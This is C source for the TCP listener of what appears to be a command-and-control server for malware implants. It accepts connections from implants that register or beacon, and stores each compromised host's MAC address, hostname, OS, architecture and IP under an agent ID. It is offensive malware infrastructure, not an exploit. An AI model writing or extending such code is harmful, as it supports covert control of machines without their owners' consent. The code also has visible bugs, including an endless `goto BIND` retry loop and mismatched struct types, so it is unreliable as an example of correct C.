#include "tcp_listener.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <pthread.h>
#include <cjson/cJSON.h>
#include "beacon_tcp.h"

#include "db.h"
#include "../agent.h"

void* tcp_agent_conn(void *port) {
    int AGENT_PORT = *(int*)port;
    struct sockaddr_in clientAddr;
    socklen_t client_len = sizeof(clientAddr);
    int serverSock;

    serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock == -1) {
        perror("Socket creation failed");
        sleep(60);
        return NULL;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(AGENT_PORT);
    serverAddr.sin_family = AF_INET;

    BIND:
    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr))) {
        perror("binding failed");
        goto BIND;
        sleep(30);
        close(serverSock);
        return NULL;
    }

    if (listen(serverSock, SOMAXCONN) == -1) {
        perror("Listen Failed");
        close(serverSock);
        sleep(60);
        return NULL;
    }

    while (1) {
        int sock;
        if ((sock = accept(serverSock, (struct sockaddr*)&clientAddr, (socklen_t*)&client_len)) < 0) {
            perror("Accept failed");
            sleep(10);
            continue;
        }

        // port = ntohs(clientAddr.sin_port)
        // ip = inet_ntoa(client_addr.sin_addr)

        pthread_t thread;
        struct tcp_thread_args *args = malloc(sizeof(struct tcp_thread_args));
        args->sock = sock;
        strcpy(args->ip, inet_ntoa(clientAddr.sin_addr));

        if (pthread_create(&thread, NULL, tcp_agent_handler, (void*)args) < 0) {
            perror("could not create thread");
            free(args);
            continue;
        }
        // Detach thread so resources are automatically freed on exit
        pthread_detach(thread);
    }
    close(serverSock);
    return NULL;
}


void *tcp_agent_handler(void *args) {
    struct thread_args *arg = (struct thread_args*)args;
    int sock = arg->sock;


    // recieves message from implant register or beaconing
    char buffer[BUFFER_SIZE];
    int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
    if (bytes_received <= 0) {
        perror("recv failed");
        return NULL;
    }
    buffer[bytes_received] = '\0';

    cJSON *json = cJSON_Parse(buffer);
    if (!json) {
        printf("Error parsing JSON!\n");
        return NULL;
    }

    cJSON *type = cJSON_GetObjectItem(json, "mode");
    if (strcmp(type->valuestring, "register") == 0) {
        tcp_register_agent(json, arg->ip, sock);
    } else if (strcmp(type->valuestring, "beacon") == 0) {
        tcp_beacon(json, sock);
    } else if (strcmp(type->valuestring, "session") == 0) {
        // session mode
        // session();
    }

    //cJSON_Delete(json);
    close(sock);
    free(args);
    return NULL;
}




void tcp_register_agent(cJSON *json, char *ip, int sock) {  

    cJSON *mac = cJSON_GetObjectItem(json, "mac");
    cJSON *hostname =  cJSON_GetObjectItem(json, "hostname");
    cJSON *os =  cJSON_GetObjectItem(json, "os");
    cJSON *arch = cJSON_GetObjectItem(json, "arch");

    char input[255];
    snprintf(input, sizeof(input), "%s-%s-%s-%s", mac->valuestring, hostname->valuestring, os->valuestring, arch->valuestring);
    char agent_id[65];
    get_agent_id(input, agent_id);

    // check if id already exists in database
    if (check_agent_id(agent_id) == 1) goto REPLY;

    //log
    log_new_agent(agent_id, os->valuestring, hostname->valuestring, mac->valuestring, arch->valuestring);

    // register to datbase (agent_id, os, ip, mac, hostname)
    // check if agent id exists
    struct db_agents args;
    strncpy(args.agent_id, agent_id, sizeof(args.agent_id) - 1);
    args.agent_id[sizeof(args.agent_id) - 1] = '\0';
    strncpy(args.os, os->valuestring, sizeof(args.os) - 1);
    args.os[sizeof(args.os) - 1] = '\0';
    strncpy(args.ip, ip, sizeof(args.ip) - 1);
    args.ip[sizeof(args.ip) - 1] = '\0';
    strncpy(args.mac, mac->valuestring, sizeof(args.mac) - 1);
    args.mac[sizeof(args.mac) - 1] = '\0';
    strncpy(args.hostname, hostname->valuestring, sizeof(args.hostname) - 1);
    args.hostname[sizeof(args.hostname) - 1] = '\0';

    strncpy(args.arch, arch->valuestring, sizeof(args.arch) - 1);
    args.arch[sizeof(args.arch) - 1] = '\0';
    new_agent(args);

    // reply with agent id
    REPLY:
    cJSON *json_reply = cJSON_CreateObject();
    cJSON_AddStringToObject(json_reply, "mode", "ack");
    cJSON_AddStringToObject(json_reply, "agent_id", agent_id);

    char *reply = cJSON_Print(json_reply);
    send(sock, reply, strlen(reply), 0);

    free(reply);
    cJSON_Delete(json_reply);
}
